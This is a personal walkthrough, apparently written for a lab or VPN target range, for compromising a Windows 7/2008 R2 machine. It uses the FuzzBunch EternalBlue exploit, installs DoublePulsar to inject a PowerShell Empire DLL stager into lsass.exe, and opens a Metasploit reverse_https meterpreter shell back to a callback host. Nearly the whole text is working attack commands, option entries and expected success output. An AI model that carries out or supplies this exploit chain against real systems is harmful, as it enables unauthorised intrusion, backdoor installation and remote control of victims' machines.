
#set up openvpn config


#substitute the address 
nmap -f 192.168.1.*
(get that the server is vulnerable)

#cd to dir
cd /root/.wine-fuzzbunch/drive_c/fuzzbunch-debian/windows/


wine cmd.exe


python fb.py 

enter target default:1p

10.10.10.2

#substitute for target ip from nmap



Default Callback IP Address [] : 10.10.10.1

#substitute for host ip on tun0 interface (find this through ifconfig in another shell window)

2 (create a New Project)


use redirection:

NOOOOOOOOOOOOOOOOOOOOO

default for everything else




enter default callback address:


setup default settings

use EternalBlue

enter

enter

enter

enter

enter

enter

enter

enter

enter


#execute plugin yes


#should fire correctly


1 
#choose win72k8r2


1
#choose traditional deployment from within fuzzbunch
y



#this should be the output
###########
#] Receiving response from exploit packet
    [+] ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] Sending egg to corrupted connection.
[*] Triggering free of corrupted buffer.
[*] Pinging backdoor...
    [+] Backdoor returned code: 10 - Success!
    [+] Ping returned Target architecture: x64 (64-bit)
    [+] Backdoor installed
######

#KEEP A VERY CLOSE NOTE OF WHAT ARCHITECTURE IT SAYS IT IS HERE, VERY IMPORTANT
#X64 OR x86
#SOMEONE ELSE MAY HAVE ALSO ALREADY BACKDOORED IT, SO FAILURE TO EXECUTE DOESNT NECESSERALY MEAN YOU CANT USE DOUBLEPULSAR
#sorry for caps


#new terminal

cd /opt/Empire

./empire 

lis
listeners


#kill any existing listeners by typing kill (listenername)

set Name EternalBlue

#may need to change this if it's your second listener :)


set Host http://10.10.10.1


set Port 8080

execute
#[*] Listener 'EternalBlue' successfully started.



list
#in same terminal

usestager dll EternalBlue
#VERY IMPORTANT THE ARCH SET HERE IS CONGRUENT WITH THE ARCH NOTED EARLIER!!!!!!!!
Set Arch x64

execute

#[*] Stager output written out to: /tmp/launcher.dll



#new terminal!

cp /tmp/launcher.dll \:\root\.wine-fuzzbunch\drive_c\fuzzbunch-debian\windows\launcher.dll

#go back to fuzzbunch terminal

use doublepulsar


enter


enter


0

enter
#set arch to x64 OR WHATEVER IT WAS EARLIER (v important)

2

#set function to rundll [2]

#set location of dll to

Z:\root\.wine-fuzzbunch\drive_c\fuzzbunch-debian\windows\launcher.dll

1

lsass.exe

yes


#########
	[+] Backdoor returned code: 10 - Success!
	[+] Backdoor returned code: 10 - Success!
	[+] Backdoor returned code: 10 - Success!
	[+] Backdoor returned code: 10 - Success!
	[+] Backdoor returned code: 10 - Success!
	[+] Backdoor returned code: 10 - Success!
	[+] Backdoor returned code: 10 - Success!
	[+] Backdoor returned code: 10 - Success!
	[+] Backdoor returned code: 10 - Success!
	[+] Backdoor returned code: 10 - Success!
	[+] Backdoor returned code: 10 - Success!
	[+] Backdoor returned code: 10 - Success!
#############################
#go back to empire


interact D3ZPLG3Z33G
#or whatever the agents name is that just popped up on the listeners thread


#start up a meterpreter window in msfconsole in yet another terminal

msfconsole


use multi/handler

set PAYLOAD windows/meterpreter/reverse_https

set LHOST 10.10.10.1

set LPORT 8888

exploit

#GO BACK TO THE POWERSHELL EMPIRE TERMINAL

usemodule code_execution/invoke_shellcode

set Lhost 10.10.10.1

set Lport 8888

execute 

#now go back to the metasploit window and you should be in a shell

#try sessions -i 1

you know have a meterpreter session on the target system
#yours sincerely freddie barr-smith
